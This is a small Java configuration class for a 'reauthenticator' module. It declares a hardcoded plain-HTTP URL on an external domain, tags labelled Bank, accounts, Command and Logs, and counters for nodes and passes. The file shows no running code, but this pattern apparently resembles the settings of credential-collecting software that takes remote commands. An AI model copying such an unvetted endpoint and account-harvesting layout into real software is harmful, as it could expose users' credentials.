package com.cloudcore.reauthenticator.core;

public class Config  {


    /* Constant Fields */

    public static final String MODULE_NAME = "reauthenticator";

    public static final boolean KEEP_ANS = true;

    public static final String URL_DIRECTORY = "http://michael.pravoslavnye.ru/";

    public static final int EXPIRATION_YEARS = 2;
    public static final int REAUTHENTICATE_YEARS = 1;

    public static final String TAG_DETECTED = "Detected";
    public static final String TAG_IMPORT = "Import";
    public static final String TAG_SUSPECT = "Suspect";

    public static final String TAG_BANK = "Bank";

    public static final String TAG_ACCOUNTS = "accounts";
    public static final String TAG_COMMAND = "Command";
    public static final String TAG_LOGS = "Logs";


    /* Fields */

    public static int milliSecondsToTimeOut = 2000;
    public static int multiDetectLoad = 200;
    public static int nodeCount = 25;
    public static int passCount = 16;

}
